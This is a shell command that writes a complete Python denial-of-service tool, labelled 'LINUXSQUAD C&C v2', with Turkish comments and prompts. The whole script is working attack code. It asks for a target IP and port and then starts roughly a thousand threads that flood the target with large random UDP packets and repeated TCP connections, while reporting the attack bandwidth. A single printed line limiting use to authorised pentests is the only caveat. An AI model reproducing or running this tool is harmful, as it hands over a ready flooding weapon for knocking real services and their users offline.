cd ~/linuxsquad-ddos && rm -f cc_controller.py && cat > cc_controller.py << 'ENDOFFILE'
#!/usr/bin/env python3
import socket, threading, json, time, os, sys, random

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════╗")
print("║   LINUXSQUAD C&C v2 - 5 BOT DAHİLİ (TEK DOSYA)                   ║")
print("╚══════════════════════════════════════════════════════════════════╝")
print("\033[0m")

# ==================== KONFİG ====================
target = ""
port = 0
sure = 0
metod = "mixed"
saldiri_aktif = threading.Event()
stats = {"udp_packets": 0, "udp_bytes": 0, "http_requests": 0, "errors": 0, "start_time": 0}
stats_lock = threading.Lock()

BOT_ISIMLERI = ["Kalkan", "Mızrak", "Yıldırım", "Cehennem", "Fırtına"]

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

# ==================== UDP FLOOD ====================
def udp_bot(bot_adi):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    except:
        return
    while saldiri_aktif.is_set():
        try:
            tport = port if random.random() > 0.25 else random.randint(1, 65535)
            p = random.randbytes(random.randint(4096, 14000))
            s.sendto(p, (target, tport))
            update_stats(udp_pkt=1, udp_bytes=len(p))
        except:
            update_stats(err=1)

# ==================== TCP FLOOD ====================
def tcp_bot(bot_adi):
    while saldiri_aktif.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.send(random.randbytes(1024))
            s.close()
            update_stats(http_req=1)
        except:
            update_stats(err=1)

# ==================== ISTATISTIK ====================
def stats_printer():
    baslangic = time.time()
    while saldiri_aktif.is_set() or time.time() - baslangic < 2:
        time.sleep(3)
        gecen = time.time() - baslangic
        if gecen < 1: continue
        with stats_lock:
            mbps = (stats["udp_bytes"] * 8) / (gecen * 1_000_000)
            gbps = mbps / 1000
            print(f"\r\033[96m[TOPLAM] UDP: {stats['udp_packets']:,} pkt | {mbps:,.0f} Mbps ({gbps:.2f} Gbps) | HTTP: {stats['http_requests']:,} req | Hata: {stats['errors']:,} | {gecen:.0f}s\033[0m", end="")

# ==================== ANA ====================
if __name__ == "__main__":
    print("\033[96m")
    print("[!] SADECE IZINLI PENTEST ORTAMINDA KULLANIN")
    print("[!] 5 BOT DA OTOMATIK AYNI ANDA BASLAYACAK\n")
    
    target = input("Hedef IP: ").strip()
    port = int(input("Hedef Port: ").strip())
    sure = int(input("Sure (saniye, 0=suresiz): ").strip() or "0")
    metod = input("Metod (udp/tcp/mixed): ").strip().lower() or "mixed"
    
    print(f"\n\033[93m[+] Hedef: {target}:{port} | Sure: {sure}s | Metod: {metod.upper()}\033[0m")
    
    # Onay
    onay = input(f"\n\033[91m[!] 5 BOT ile saldiri baslatilsin mi? (e/H): \033[0m")
    if onay.lower() != "e":
        print("\033[93m[-] Iptal edildi\033[0m")
        sys.exit(0)
    
    # İstatistikleri sıfırla
    with stats_lock:
        stats["start_time"] = time.time()
    
    saldiri_aktif.set()
    
    # Her bot icin thread havuzu
    BOT_BASINA_THREAD = 200  # 5 bot x 200 = 1000 thread
    
    print(f"\n\033[92m[+] 5 Bot baslatiliyor...\033[0m")
    
    for bot in BOT_ISIMLERI:
        if metod in ["udp", "mixed"]:
            for _ in range(BOT_BASINA_THREAD):
                threading.Thread(target=udp_bot, args=(bot,), daemon=True).start()
        if metod in ["tcp", "mixed"]:
            for _ in range(BOT_BASINA_THREAD // 3):
                threading.Thread(target=tcp_bot, args=(bot,), daemon=True).start()
        print(f"\033[92m[✓] {bot} aktif -> {target}:{port}\033[0m")
    
    toplam_thread = (BOT_BASINA_THREAD * 5) if metod == "udp" else (BOT_BASINA_THREAD * 5 + (BOT_BASINA_THREAD // 3) * 5) if metod == "tcp" else (BOT_BASINA_THREAD * 5 + (BOT_BASINA_THREAD // 3) * 5)
    print(f"\033[92m[+] Toplam ~{toplam_thread} thread calisiyor\033[0m")
    
    # Stats printer
    threading.Thread(target=stats_printer, daemon=True).start()
    
    # Bekle
    try:
        basla = time.time()
        if sure > 0:
            while time.time() - basla < sure:
                time.sleep(1)
        else:
            print("\n\033[93m[+] Suresiz mod. Ctrl+C ile durdurun.\033[0m")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[91m[-] Durduruluyor...\033[0m")
    finally:
        saldiri_aktif.clear()
        time.sleep(1)
        gecen = time.time() - stats["start_time"]
        with stats_lock:
            mbps = (stats["udp_bytes"] * 8) / (gecen * 1_000_000) if gecen > 0 else 0
        print(f"\n\033[92m[+] Test bitti! {gecen:.0f}s | Ortalama: {mbps:,.0f} Mbps ({mbps/1000:.2f} Gbps)\033[0m")
ENDOFFILE
